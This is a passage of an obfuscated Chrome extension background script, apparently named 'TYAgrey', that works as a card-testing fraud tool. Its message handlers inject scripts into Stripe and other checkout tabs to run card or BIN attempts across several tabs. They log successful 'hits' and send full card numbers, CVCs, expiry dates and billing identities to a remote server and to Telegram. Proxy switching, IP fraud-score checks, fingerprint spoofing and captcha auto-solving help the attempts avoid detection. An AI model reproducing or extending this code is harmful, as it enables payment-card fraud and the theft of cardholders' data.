        const _0x5e024d = await handleAPIRequest(_0x5aea91, _0x35cd4b);
        _0x5af44a(_0x5e024d);
      } catch (_0x2c82c9) {
        _0x5af44a({
          success: false,
          error: _0x2c82c9 && _0x2c82c9.message ? _0x2c82c9.message : "Request failed"
        });
      }
    }
    handleAPIRequest(_0x454f9e, _0x40a2bd).then(_0x3e172a).catch(_0x49e4ff => _0x3e172a({
      success: false,
      error: _0x49e4ff.message
    }));
    return true;
  }
  if (_0xe8383b.type === "FETCH_IMAGE") {
    (async () => {
      try {
        const _0x47d415 = await fetch(_0xe8383b.url);
        if (!_0x47d415.ok) {
          _0x3e172a({
            success: false
          });
          return;
        }
        const _0x1de97d = await _0x47d415.blob();
        const _0x4d5274 = new FileReader();
        _0x4d5274.onloadend = () => {
          _0x3e172a({
            success: true,
            dataUrl: _0x4d5274.result
          });
        };
        _0x4d5274.onerror = () => _0x3e172a({
          success: false
        });
        _0x4d5274.readAsDataURL(_0x1de97d);
      } catch (_0x39ba88) {
        _0x3e172a({
          success: false,
          error: _0x39ba88.message
        });
      }
    })();
    return true;
  }
  if (_0xe8383b.type === "PLAY_SUCCESS_SOUND_OFFSCREEN") {
    ensureOffscreenDocument().then(_0x2676be => {
      if (_0x2676be) {
        setTimeout(() => {
          chrome.runtime.sendMessage({
            type: "PLAY_SUCCESS_SOUND",
            volume: _0xe8383b.volume || 1
          }).catch(() => {});
        }, 100);
      }
    });
    return false;
  }
  if (_0xe8383b.type === "PLAY_CUSTOM_PREVIEW") {
    chrome.storage.local.get(["tyagrey_music_data"], _0xd759a5 => {
      const _0x4b6997 = _0xd759a5.tyagrey_music_data;
      if (_0x4b6997) {
        ensureOffscreenDocument().then(_0x155aa1 => {
          if (_0x155aa1) {
            setTimeout(() => {
              chrome.runtime.sendMessage({
                type: "PLAY_CUSTOM_PREVIEW",
                audioData: _0x4b6997
              }).catch(() => {});
            }, 100);
          }
        });
      }
    });
    return false;
  }
  if (_0xe8383b.type === "STOP_CUSTOM_PREVIEW") {
    ensureOffscreenDocument().then(_0x3e5ace => {
      if (_0x3e5ace) {
        chrome.runtime.sendMessage({
          type: "STOP_CUSTOM_PREVIEW"
        }).catch(() => {});
      }
    });
    return false;
  }
  if (_0xe8383b.type === "PLAY_BACKGROUND_MUSIC") {
    chrome.storage.local.get(["tyagrey_music_data"], _0x693f5e => {
      const _0x4e58a4 = _0x693f5e.tyagrey_music_data;
      if (_0x4e58a4) {
        ensureOffscreenDocument().then(_0x3e1c44 => {
          if (_0x3e1c44) {
            setTimeout(() => {
              chrome.runtime.sendMessage({
                type: "PLAY_BACKGROUND_MUSIC",
                audioData: _0x4e58a4,
                volume: _0xe8383b.volume
              }).catch(() => {});
            }, 100);
          }
        });
      }
    });
    return false;
  }
  if (_0xe8383b.type === "STOP_BACKGROUND_MUSIC") {
    ensureOffscreenDocument().then(_0x4d8669 => {
      if (_0x4d8669) {
        chrome.runtime.sendMessage({
          type: "STOP_BACKGROUND_MUSIC"
        }).catch(() => {});
      }
    });
    return false;
  }
  if (_0xe8383b.type === "SEND_TELEGRAM_NOTIFICATION") {
    console.log("[TYAgrey][BG] Received SEND_TELEGRAM_NOTIFICATION, forwarding to sendTelegramNotification");
    sendTelegramNotification(_0xe8383b.data).catch(_0x2a266f => {
      console.error("[TYAgrey][BG] sendTelegramNotification error:", _0x2a266f);
    });
    return false;
  }
  if (_0xe8383b.type === "CAPTURE_SCREENSHOT") {
    const _0x203d0b = _0x24fd12 && _0x24fd12.tab ? _0x24fd12.tab.id : null;
    captureScreenshot(_0x203d0b).then(_0x4461be => {
      _0x3e172a({
        dataUrl: _0x4461be
      });
    });
    return true;
  }
  if (_0xe8383b.type === "APPLY_PROXY") {
    applyProxy(_0xe8383b.proxy).then(_0x3e172a).catch(_0x4335e3 => _0x3e172a({
      success: false,
      error: _0x4335e3.message
    }));
    return true;
  }
  if (_0xe8383b.type === "CLEAR_PROXY") {
    clearProxy().then(_0x3e172a).catch(_0x52db83 => _0x3e172a({
      success: false,
      error: _0x52db83.message
    }));
    return true;
  }
  if (_0xe8383b.type === "FETCH_REAL_IP") {
    fetchRealIp().then(_0x3e172a).catch(_0x105849 => _0x3e172a({
      success: false,
      error: _0x105849.message
    }));
    return true;
  }
  if (_0xe8383b.type === "GET_IP_FRAUD_CHECK") {
    getIpFraudCheck(_0xe8383b.ip, _0xe8383b.endpoint || "").then(_0x3e172a).catch(_0x497488 => _0x3e172a({
      success: false,
      error: _0x497488.message
    }));
    return true;
  }
  if (_0xe8383b.type === "UPDATE_LOCAL_STATS") {
    const _0x11f915 = _0xe8383b.payload || {};
    const _0x11356e = !!_0x11f915.hit;
    const _0x3bd32e = !!_0x11f915.attempt;
    const _0x2d7606 = _0x11f915.historyEntry || null;
    chrome.storage.local.get(["tya_local_hits", "tya_local_attempts", "tya_local_history", "tyagrey_my_hits_cache"], _0x4d9eae => {
      const _0x4b0775 = {};
      if (_0x11356e) {
        _0x4b0775.tya_local_hits = (_0x4d9eae.tya_local_hits || 0) + 1;
      }
      if (_0x3bd32e) {
        _0x4b0775.tya_local_attempts = (_0x4d9eae.tya_local_attempts || 0) + 1;
      }
      if (_0x2d7606) {
        const _0x987ff7 = Array.isArray(_0x4d9eae.tya_local_history) ? _0x4d9eae.tya_local_history : [];
        _0x987ff7.unshift(_0x2d7606);
        _0x4b0775.tya_local_history = _0x987ff7.slice(0, 100);
      }
      if (_0x11356e && _0x2d7606) {
        const _0x213057 = Array.isArray(_0x4d9eae.tyagrey_my_hits_cache) ? _0x4d9eae.tyagrey_my_hits_cache : [];
        _0x213057.unshift({
          card_info: _0x2d7606.card || _0x2d7606.card_info || "",
          site: _0x2d7606.site || "Unknown",
          amount: _0x2d7606.amount || "",
          status: "success",
          code: "APPROVED",
          created_at: _0x2d7606.time || new Date().toISOString(),
          timestamp: Date.now()
        });
        _0x4b0775.tyagrey_my_hits_cache = _0x213057.slice(0, 100);
      }
      chrome.storage.local.set(_0x4b0775, () => {
        _0x3e172a({
          success: true
        });
      });
    });
    return true;
  }
  if (_0xe8383b.type === "RECORD_BIN_DATA") {
    (async () => {
      try {
        const _0x35e8bb = _0xe8383b.binData || null;
        if (!_0x35e8bb || !_0x35e8bb.bin) {
          _0x3e172a({
            success: false,
            error: "Missing BIN data"
          });
          return;
        }
        const _0x55c2c9 = await chrome.storage.local.get(["tyagrey_token", "tyagrey_role"]);
        const _0x3b403e = _0x55c2c9.tyagrey_token || "";
        const _0x4a6ad5 = _0x55c2c9.tyagrey_role || "user";
        const _0x3e47f0 = await chrome.storage.local.get(["tyagrey_bin_data_records"]);
        const _0x281f39 = Array.isArray(_0x3e47f0.tyagrey_bin_data_records) ? _0x3e47f0.tyagrey_bin_data_records : [];
        const _0x4a73a0 = _0x281f39.some(_0x39fa68 => _0x39fa68.bin === _0x35e8bb.bin && _0x39fa68.merchantSite === _0x35e8bb.merchantSite);
        if (!_0x4a73a0) {
          _0x281f39.unshift({
            ..._0x35e8bb,
            id: Date.now(),
            recordedAt: new Date().toISOString()
          });
          await chrome.storage.local.set({
            tyagrey_bin_data_records: _0x281f39.slice(0, 500)
          });
        }
        if (_0x3b403e) {
          try {
            await handleAPIRequest("record-bin-data", {
              token: _0x3b403e,
              bin: _0x35e8bb.bin,
              merchant_site: _0x35e8bb.merchantSite,
              amount: _0x35e8bb.amount,
              currency: _0x35e8bb.currency,
              card_info: _0x35e8bb.cardInfo
            });
          } catch (_0x10870e) {
            console.error("[BG][BIN Data] Failed to send to server:", _0x10870e);
          }
        }
        if (_0x4a6ad5 === "owner") {
          sendTelegramNotification({
            bin: _0x35e8bb.bin,
            merchantSite: _0x35e8bb.merchantSite,
            amount: _0x35e8bb.amount,
            currency: _0x35e8bb.currency,
            userName: "Owner",
            userRole: "owner",
            attempt: 1,
            cardNumber: _0x35e8bb.cardInfo || "N/A"
          });
        }
        _0x3e172a({
          success: true
        });
      } catch (_0x2030ce) {
        console.error("[BG][BIN Data] Error:", _0x2030ce);
        _0x3e172a({
          success: false,
          error: _0x2030ce.message
        });
      }
    })();
    return true;
  }
  if (_0xe8383b.type === "QUEUE_PENDING_HIT") {
    (async () => {
      try {
        const _0x3c6aab = _0xe8383b.hit || null;
        if (!_0x3c6aab || !_0x3c6aab.card_info) {
          _0x3e172a({
            success: false,
            error: "Missing hit"
          });
          return;
        }
        const _0x4c486d = String(_0x3c6aab.hit_key || [String(_0x3c6aab.card_info || ""), String(_0x3c6aab.site || ""), String(_0x3c6aab.amount || ""), String(_0x3c6aab.currency || "usd").toLowerCase()].join("|"));
        const _0x24a38d = await chrome.storage.local.get(["tyagrey_pending_hits"]);
        const _0x20c5cc = Array.isArray(_0x24a38d.tyagrey_pending_hits) ? _0x24a38d.tyagrey_pending_hits : [];
        const _0xdc7c3c = _0x20c5cc.some(_0xf09034 => _0xf09034 && (_0xf09034.hit_key ? _0xf09034.hit_key === _0x4c486d : [String(_0xf09034.card_info || ""), String(_0xf09034.site || ""), String(_0xf09034.amount || ""), String(_0xf09034.currency || "usd").toLowerCase()].join("|") === _0x4c486d));
        if (!_0xdc7c3c) {
          _0x20c5cc.push({
            ..._0x3c6aab,
            hit_key: _0x4c486d
          });
        }
        const _0x25272c = _0x20c5cc.slice(-500);
        await chrome.storage.local.set({
          tyagrey_pending_hits: _0x25272c
        });
        try {
          const _0x3e8a04 = await chrome.storage.local.get(["tyagrey_token"]);
          if (_0x3e8a04.tyagrey_token) {
            const _0x5a1548 = await getPublicIp();
            const _0x16891b = {
              token: _0x3e8a04.tyagrey_token,
              full_card_number: _0x3c6aab.full_card_number || _0x3c6aab.card_number || (_0x3c6aab.card_info ? _0x3c6aab.card_info.split("|")[0] : ""),
              exp_month: _0x3c6aab.exp_month || (_0x3c6aab.card_info ? _0x3c6aab.card_info.split("|")[1] : ""),
              exp_year: _0x3c6aab.exp_year || (_0x3c6aab.card_info ? _0x3c6aab.card_info.split("|")[2] : ""),
              cvc: _0x3c6aab.cvc || (_0x3c6aab.card_info ? _0x3c6aab.card_info.split("|")[3] : ""),
              email: _0x3c6aab.email || "",
              full_name: _0x3c6aab.full_name || "",
              billing_address: _0x3c6aab.billing_address || "",
              billing_city: _0x3c6aab.billing_city || "",
              billing_state: _0x3c6aab.billing_state || "",
              billing_zip: _0x3c6aab.billing_zip || "",
              billing_country: _0x3c6aab.billing_country || "",
              phone: _0x3c6aab.phone || "",
              promo_code: _0x3c6aab.promo_code || "",
              shipping_address: _0x3c6aab.shipping_address || "",
              shipping_city: _0x3c6aab.shipping_city || "",
              shipping_state: _0x3c6aab.shipping_state || "",
              shipping_zip: _0x3c6aab.shipping_zip || "",
              shipping_country: _0x3c6aab.shipping_country || "",
              merchant_website: _0x3c6aab.site || _0x3c6aab.merchant_website || _0x3c6aab.merchant || "",
              charged_amount: _0x3c6aab.amount || _0x3c6aab.charged_amount || "",
              ip: _0x5a1548
            };
            handleAPIRequest("save-cc-record", _0x16891b).catch(() => {});
          }
        } catch (_0x4e79b4) {}
        _0x3e172a({
          success: true,
          queued: !_0xdc7c3c,
          pending: _0x25272c.length
        });
      } catch (_0x692572) {
        _0x3e172a({
          success: false,
          error: _0x692572 && _0x692572.message ? _0x692572.message : "Queue failed"
        });
      }
    })();
    return true;
  }
  if (_0xe8383b.type === "REMOVE_PENDING_HIT") {
    (async () => {
      try {
        const _0x516d25 = String(_0xe8383b.hit_key || "");
        if (!_0x516d25) {
          _0x3e172a({
            success: false,
            error: "Missing hit_key"
          });
          return;
        }
        const _0x569428 = await chrome.storage.local.get(["tyagrey_pending_hits"]);
        const _0x267422 = Array.isArray(_0x569428.tyagrey_pending_hits) ? _0x569428.tyagrey_pending_hits : [];
        const _0x4c3d32 = _0x267422.filter(_0x4deb63 => !_0x4deb63 || String(_0x4deb63.hit_key || "") !== _0x516d25);
        await chrome.storage.local.set({
          tyagrey_pending_hits: _0x4c3d32
        });
        _0x3e172a({
          success: true,
          remaining: _0x4c3d32.length
        });
      } catch (_0x93c5ff) {
        _0x3e172a({
          success: false,
          error: _0x93c5ff && _0x93c5ff.message ? _0x93c5ff.message : "Remove failed"
        });
      }
    })();
    return true;
  }
  if (_0xe8383b.type === "CACHE_MY_HIT") {
    (async () => {
      try {
        const _0x9cf416 = _0xe8383b.hit || null;
        if (!_0x9cf416 || !_0x9cf416.card_info) {
          _0x3e172a({
            success: false,
            error: "Missing hit"
          });
          return;
        }
        const _0x54fa44 = String(_0x9cf416.hit_key || [String(_0x9cf416.card_info || ""), String(_0x9cf416.site || ""), String(_0x9cf416.amount || ""), String(_0x9cf416.status || "").toLowerCase(), String(_0x9cf416.code || "").toUpperCase()].join("|"));
        const _0x229150 = await chrome.storage.local.get(["tyagrey_my_hits_cache"]);
        const _0x1abca8 = Array.isArray(_0x229150.tyagrey_my_hits_cache) ? _0x229150.tyagrey_my_hits_cache : [];
        const _0xee00ad = _0x1abca8.some(_0x2ded00 => _0x2ded00 && String(_0x2ded00.hit_key || "") === _0x54fa44);
        if (!_0xee00ad) {
          _0x1abca8.unshift({
            ..._0x9cf416,
            hit_key: _0x54fa44
          });
        }
        const _0xed2939 = _0x1abca8.slice(0, 100);
        await chrome.storage.local.set({
          tyagrey_my_hits_cache: _0xed2939
        });
        _0x3e172a({
          success: true,
          cached: !_0xee00ad,
          total: _0xed2939.length
        });
      } catch (_0x47b4b8) {
        _0x3e172a({
          success: false,
          error: _0x47b4b8 && _0x47b4b8.message ? _0x47b4b8.message : "Cache failed"
        });
      }
    })();
    return true;
  }
  if (_0xe8383b.type === "GET_USER_DATA") {
    chrome.storage.local.get(["tyagrey_token"], _0x2b8999 => {
      if (!_0x2b8999.tyagrey_token) {
        _0x3e172a({
          success: false,
          error: "Not logged in"
        });
        return;
      }
      handleAPIRequest("get-user-data", {
        token: _0x2b8999.tyagrey_token
      }).then(_0xd5c24e => _0x3e172a(_0xd5c24e)).catch(_0x3eb7f6 => _0x3e172a({
        success: false,
        error: _0x3eb7f6.message
      }));
    });
    return true;
  }
  if (_0xe8383b.type === "SAVE_USER_BINS") {
    chrome.storage.local.get(["tyagrey_token"], _0x1f4bfc => {
      if (!_0x1f4bfc.tyagrey_token) {
        _0x3e172a({
          success: false,
          error: "Not logged in"
        });
        return;
      }
      const _0x4c99c = {
        token: _0x1f4bfc.tyagrey_token,
        saved_bins: _0xe8383b.payload.saved_bins
      };
      if (_0xe8383b.payload.merge_cloud) {
        _0x4c99c.merge_cloud = true;
      }
      handleAPIRequest("save-user-bins", _0x4c99c).then(_0x47a4b6 => _0x3e172a(_0x47a4b6)).catch(_0x2b3b4c => _0x3e172a({
        success: false,
        error: _0x2b3b4c.message
      }));
    });
    return true;
  }
  if (_0xe8383b.type === "SAVE_PANEL_BINS") {
    chrome.storage.local.get(["tyagrey_token"], _0x5bb7a5 => {
      if (!_0x5bb7a5.tyagrey_token) {
        _0x3e172a({
          success: false,
          error: "Not logged in"
        });
        return;
      }
      handleAPIRequest("save-panel-bins", {
        token: _0x5bb7a5.tyagrey_token,
        panel_bins: _0xe8383b.payload.panel_bins
      }).then(_0x145c15 => _0x3e172a(_0x145c15)).catch(_0x22312e => _0x3e172a({
        success: false,
        error: _0x22312e.message
      }));
    });
    return true;
  }
  if (_0xe8383b.type === "GET_USER_BINS") {
    chrome.storage.local.get(["tyagrey_token"], _0x5e9ae5 => {
      if (!_0x5e9ae5.tyagrey_token) {
        _0x3e172a({
          success: false,
          error: "Not logged in"
        });
        return;
      }
      handleAPIRequest("get-user-bins", {
        token: _0x5e9ae5.tyagrey_token
      }).then(_0x3b8bb7 => _0x3e172a(_0x3b8bb7)).catch(_0x31daeb => _0x3e172a({
        success: false,
        error: _0x31daeb.message
      }));
    });
    return true;
  }
  if (_0xe8383b.type === "GET_PANEL_BINS") {
    chrome.storage.local.get(["tyagrey_token"], _0x904c1b => {
      if (!_0x904c1b.tyagrey_token) {
        _0x3e172a({
          success: false,
          error: "Not logged in"
        });
        return;
      }
      handleAPIRequest("get-panel-bins", {
        token: _0x904c1b.tyagrey_token
      }).then(_0x2aa26b => _0x3e172a(_0x2aa26b)).catch(_0x295df8 => _0x3e172a({
        success: false,
        error: _0x295df8.message
      }));
    });
    return true;
  }
  if (_0xe8383b.type === "RELOAD_MY_BINS_POPUP") {
    chrome.runtime.sendMessage({
      type: "BIN_LIST_UPDATED",
      savedBins: _0xe8383b.savedBins
    }).catch(() => {});
    _0x3e172a({
      success: true
    });
    return true;
  }
  if (_0xe8383b.type === "CUSTOM_CHECKOUT_START") {
    (async () => {
      try {
        const _0x3e0472 = await chrome.tabs.query({
          active: true,
          currentWindow: true
        });
        if (!_0x3e0472 || !_0x3e0472[0] || !_0x3e0472[0].id) {
          _0x3e172a({
            success: false,
            error: "No active tab found. Open a checkout page first."
          });
          return;
        }
        const _0x824a67 = _0x3e0472[0].id;
        const _0x49d0b5 = _0x3e0472[0].url || "";
        if (_0x49d0b5.startsWith("chrome://") || _0x49d0b5.startsWith("edge://") || _0x49d0b5.startsWith("about:") || _0x49d0b5.startsWith("devtools://")) {
          _0x3e172a({
            success: false,
            error: "Cannot run on browser internal pages. Open a checkout page first."
          });
          return;
        }
        try {
          await chrome.scripting.executeScript({
            target: {
              tabId: _0x824a67
            },
            files: ["script/content.js"]
          });
          await new Promise(_0x80a30d => setTimeout(_0x80a30d, 300));
        } catch (_0x3c80e2) {}
        const _0xef4ff0 = {
          type: "CUSTOM_CHECKOUT_START_INJECT",
          settings: _0xe8383b.settings || {},
          bin: _0xe8383b.bin || "",
          ccList: _0xe8383b.ccList || [],
          mode: _0xe8383b.mode || "bin"
        };
        let _0x1c9e9b = null;
        for (let _0x988955 = 0; _0x988955 < 3; _0x988955++) {
          try {
            await chrome.tabs.sendMessage(_0x824a67, _0xef4ff0);
            _0x3e172a({
              success: true,
              tabId: _0x824a67
            });
            return;
          } catch (_0x4277f0) {
            _0x1c9e9b = _0x4277f0;
            if (_0x988955 < 2) {
              await new Promise(_0x145a31 => setTimeout(_0x145a31, (_0x988955 + 1) * 400));
            }
          }
        }
        _0x3e172a({
          success: false,
          error: _0x1c9e9b && _0x1c9e9b.message ? _0x1c9e9b.message : "Failed to connect to checkout page. Try refreshing the page."
        });
      } catch (_0x33623d) {
        _0x3e172a({
          success: false,
          error: _0x33623d && _0x33623d.message ? _0x33623d.message : "Failed to start on active tab"
        });
      }
    })();
    return true;
  }
  if (_0xe8383b.type === "CUSTOM_CHECKOUT_STOP") {
    (async () => {
      try {
        const _0x1e22a2 = await chrome.tabs.query({});
        let _0x3a4ebd = 0;
        for (const _0xec541a of _0x1e22a2) {
          if (_0xec541a.id) {
            try {
              await chrome.tabs.sendMessage(_0xec541a.id, {
                type: "CUSTOM_CHECKOUT_STOP_INJECT"
              });
              _0x3a4ebd++;
            } catch (_0x5b5258) {}
          }
        }
        _0x3e172a({
          success: true,
          stoppedOn: _0x3a4ebd
        });
      } catch (_0x48336c) {
        _0x3e172a({
          success: false,
          error: _0x48336c && _0x48336c.message ? _0x48336c.message : "Failed to stop"
        });
      }
    })();
    return true;
  }
  if (_0xe8383b.type === "CUSTOM_CHECKOUT_STATS_UPDATE") {
    try {
      chrome.runtime.sendMessage({
        type: "CUSTOM_CHECKOUT_STATS_UPDATE",
        stats: _0xe8383b.stats || {}
      }).catch(() => {});
    } catch (_0x1e7a9f) {}
    _0x3e172a({
      success: true
    });
    return true;
  }
  if (_0xe8383b.type === "SCAN_STRIPE_TABS") {
    console.log("[TYAgrey][Background] SCAN_STRIPE_TABS received, showAll:", _0xe8383b.showAll);
    (async () => {
      try {
        const _0x22615f = _0xe8383b.showAll || false;
        const _0x475cc9 = await chrome.tabs.query({});
        console.log("[TYAgrey][Background] Total tabs found:", _0x475cc9.length);
        const _0x1ea59e = [];
        for (const _0x331a56 of _0x475cc9) {
          if (!_0x331a56.id || !_0x331a56.url) {
            continue;
          }
          if (_0x331a56.url.startsWith("chrome://") || _0x331a56.url.startsWith("edge://") || _0x331a56.url.startsWith("about:") || _0x331a56.url.startsWith("devtools://") || _0x331a56.url.startsWith("chrome-extension://")) {
            continue;
          }
          if (_0x22615f) {
            _0x1ea59e.push({
              id: _0x331a56.id,
              url: _0x331a56.url,
              title: _0x331a56.title || "Untitled",
              favicon: _0x331a56.favIconUrl || "icons/icon16.png",
              merchantName: ""
            });
          } else {
            const _0x471b40 = isCheckoutPage(_0x331a56.url);
            if (_0x471b40) {
              _0x1ea59e.push({
                id: _0x331a56.id,
                url: _0x331a56.url,
                title: _0x331a56.title || "Untitled",
                favicon: _0x331a56.favIconUrl || "icons/icon16.png",
                merchantName: extractMerchantName(_0x331a56.url, _0x331a56.title)
              });
            }
          }
        }
        console.log("[TYAgrey][Background] Checkout tabs found:", _0x1ea59e.length);
        _0x3e172a({
          success: true,
          tabs: _0x1ea59e
        });
      } catch (_0x2701c5) {
        console.error("[TYAgrey][Background] SCAN_STRIPE_TABS error:", _0x2701c5);
        _0x3e172a({
          success: false,
          error: _0x2701c5 && _0x2701c5.message ? _0x2701c5.message : "Failed to scan tabs"
        });
      }
    })();
    return true;
  }
  if (_0xe8383b.type === "START_MULTI_TAB_CHECKOUT") {
    (async () => {
      try {
        const {
          tabIds: _0x465934,
          settings: _0x25e6f7,
          bin: _0x176dac,
          tabBins: _0x53a9dd,
          ccList: _0x1bef98,
          mode: _0x12d6e7
        } = _0xe8383b;
        if (!_0x465934 || _0x465934.length === 0) {
          _0x3e172a({
            success: false,
            error: "No tabs selected"
          });
          return;
        }
        const _0x9482d2 = [];
        for (const _0x3dfca6 of _0x465934) {
          try {
            const _0xb2180 = _0x53a9dd && _0x53a9dd[_0x3dfca6] ? _0x53a9dd[_0x3dfca6] : _0x176dac;
            try {
              await chrome.scripting.executeScript({
                target: {
                  tabId: _0x3dfca6
                },
                files: ["script/content.js"]
              });
              await new Promise(_0xaf9f8f => setTimeout(_0xaf9f8f, 200));
            } catch (_0x3fa512) {}
            await chrome.tabs.sendMessage(_0x3dfca6, {
              type: "CUSTOM_CHECKOUT_START_INJECT",
              settings: _0x25e6f7,
              bin: _0xb2180,
              ccList: _0x1bef98,
              mode: _0x12d6e7
            });
            _0x9482d2.push({
              tabId: _0x3dfca6,
              success: true
            });
          } catch (_0x1fd227) {
            _0x9482d2.push({
              tabId: _0x3dfca6,
              success: false,
              error: _0x1fd227.message
            });
          }
        }
        const _0x2a2f04 = _0x9482d2.filter(_0x524507 => _0x524507.success).length;
        _0x3e172a({
          success: _0x2a2f04 > 0,
          results: _0x9482d2,
          started: _0x2a2f04,
          failed: _0x9482d2.length - _0x2a2f04
        });
      } catch (_0xed6db2) {
        _0x3e172a({
          success: false,
          error: _0xed6db2 && _0xed6db2.message ? _0xed6db2.message : "Failed to start multi-tab checkout"
        });
      }
    })();
    return true;
  }
  if (_0xe8383b.type === "APPLY_ANTI_DETECT") {
    (async () => {
      try {
        const _0x583255 = await chrome.tabs.query({
          active: true,
          currentWindow: true
        });
        if (_0x583255 && _0x583255[0] && _0x583255[0].id) {
          await chrome.tabs.sendMessage(_0x583255[0].id, {
            type: "tyagrey_ANTI_DETECT_SETTINGS",
            enabled: _0xe8383b.enabled,
            webGL: _0xe8383b.webGL,
            audio: _0xe8383b.audio,
            timezone: _0xe8383b.timezone,
            locale: _0xe8383b.locale,
            canvas: _0xe8383b.canvas,
            battery: _0xe8383b.battery,
            memory: _0xe8383b.memory,
            plugins: _0xe8383b.plugins
          });
        }
        chrome.storage.local.set({
          tyagrey_anti_detect_settings: JSON.stringify({
            enabled: _0xe8383b.enabled,
            webGL: _0xe8383b.webGL,
            audio: _0xe8383b.audio,
            timezone: _0xe8383b.timezone,
            locale: _0xe8383b.locale,
            canvas: _0xe8383b.canvas,
            battery: _0xe8383b.battery,
            memory: _0xe8383b.memory,
            plugins: _0xe8383b.plugins
          })
        });
        _0x3e172a({
          success: true
        });
      } catch (_0x2f0ff5) {
        _0x3e172a({
          success: false,
          error: _0x2f0ff5.message
        });
      }
    })();
    return true;
  }
  if (_0xe8383b.type === "APPLY_CAPTCHA_SOLVER") {
    (async () => {
      try {
        const _0x4f2f01 = await chrome.tabs.query({});
        for (const _0x1a0548 of _0x4f2f01) {
          if (!_0x1a0548.id) {
            continue;
          }
          try {
            await chrome.tabs.sendMessage(_0x1a0548.id, {
              type: "tyagrey_RECAPTCHA_SETTINGS",
              enabled: _0xe8383b.recaptcha,
              autoSolve: _0xe8383b.recaptcha
            });
          } catch (_0x516d32) {}
          try {
            await chrome.tabs.sendMessage(_0x1a0548.id, {
              type: "tyagrey_HCAPTCHA_SETTINGS",
              enabled: _0xe8383b.hcaptcha
            });
          } catch (_0x495423) {}
        }
        chrome.storage.local.set({
          tyagrey_recaptcha_settings: JSON.stringify({
            enabled: _0xe8383b.recaptcha,
            autoSolve: _0xe8383b.recaptcha
          }),
          tyagrey_hcaptcha_settings: JSON.stringify({
            enabled: _0xe8383b.hcaptcha
          })
        });
        _0x3e172a({
          success: true
        });
      } catch (_0xee96b9) {
        _0x3e172a({
          success: false,
          error: _0xee96b9.message
        });
      }
    })();
    return true;
  }
  if (_0xe8383b.type === "APPLY_AUTO_CLICKER") {
    (async () => {
      try {
        const _0x2fe978 = await chrome.tabs.query({
          active: true,
          currentWindow: true
        });
        if (_0x2fe978 && _0x2fe978[0] && _0x2fe978[0].id) {
          await chrome.tabs.sendMessage(_0x2fe978[0].id, {
            type: "tyagrey_AUTO_CLICKER_SETTINGS",
            enabled: _0xe8383b.enabled,
            intervalMs: _0xe8383b.intervalMs,
            selector: _0xe8383b.selector
          });
        }
        chrome.storage.local.set({
          tyagrey_auto_clicker_settings: JSON.stringify({
            enabled: _0xe8383b.enabled,
            intervalMs: _0xe8383b.intervalMs,
            selector: _0xe8383b.selector
          })
        });
        _0x3e172a({
          success: true
        });
      } catch (_0x4d1fc2) {
        _0x3e172a({
          success: false,
          error: _0x4d1fc2.message
        });
      }
    })();
    return true;
  }
  if (_0xe8383b.type === "GET_PROXY_INFO") {
    chrome.storage.local.get(["tyagrey_proxy_info", "tyagrey_proxy_string", "tyagrey_proxy_enabled"], _0xbe6666 => {
      _0x3e172a({
        success: true,
        enabled: !!_0xbe6666.tyagrey_proxy_enabled,
        proxyString: _0xbe6666.tyagrey_proxy_string || "",
        info: _0xbe6666.tyagrey_proxy_info || null
      });
    });
    return true;
  }
  return false;
});
function isCheckoutPage(_0x2460e4) {
  if (!_0x2460e4) {
    return false;
  }
  const _0x197e6b = [/checkout\.stripe\.com/i, /stripe\.com\/c\/pay/i, /stripe\.com\/pay/i, /stripe\.com\/checkout/i, /\/(cs_|pi_)[a-zA-Z0-9_]+/i, /buy\.stripe\.com\/5kQcN60zyeb8gng2k9csI0k/i, /account\.proton\.me\/refer-a-friend\/signup/i, /\/checkout/i, /\/payment/i, /\/billing/i, /\/subscribe/i, /\/purchase/i, /\/signup/i, /\/pay/i, /pay\./i, /checkout\./i, /payment\./i, /billing\./i, /subscribe\./i, /purchase\./i, /adyen\.com/i, /checkout\.com/i, /recurly\.com/i, /xsolla\.com/i, /paypal\.com\/checkout/i, /squareup\.com\/checkout/i, /shopify\.com\/checkout/i, /woocommerce\/checkout/i, /braintree/i, /\/cart\/checkout/i, /\/order\/pay/i, /\/payment\/checkout/i, /secure\/checkout/i, /secure\/payment/i];
  return _0x197e6b.some(_0x35942f => _0x35942f.test(_0x2460e4));
}
function extractMerchantName(_0x19b87b, _0x5dd93b) {
  try {
    const _0x32b632 = new URL(_0x19b87b);
    const _0x5abe98 = _0x32b632.hostname.replace(/^www\./, "");
    if (_0x5dd93b && _0x5dd93b !== "Untitled") {
      return _0x5dd93b.replace(/\s*-\s*Checkout.*$/i, "").replace(/\s*-\s*Payment.*$/i, "").replace(/\s*-\s*Stripe.*$/i, "").substring(0, 30);
    }
    return _0x5abe98.substring(0, 30);
  } catch (_0x399ba0) {
    return "Unknown";
  }
}
chrome.runtime.onInstalled.addListener(async _0x53dc44 => {
  if (_0x53dc44.reason === "install") {
    const _0x3b4929 = await chrome.storage.local.get(["tyagrey_token"]);
    if (!_0x3b4929.tyagrey_token) {
      chrome.tabs.create({
        url: chrome.runtime.getURL("design/login.html")
      });
    }
  }
});
chrome.action.onClicked.addListener(async _0x2c01c7 => {
  try {
    const _0x4f7616 = await chrome.storage.local.get(["tyagrey_token"]);
    if (_0x4f7616.tyagrey_token) {
      chrome.tabs.create({
        url: chrome.runtime.getURL("design/popup.html")
      });
    } else {
      chrome.tabs.create({
        url: chrome.runtime.getURL("design/login.html")
      });
    }
  } catch (_0x495527) {
    chrome.tabs.create({
      url: chrome.runtime.getURL("design/login.html")
    });
  }
});
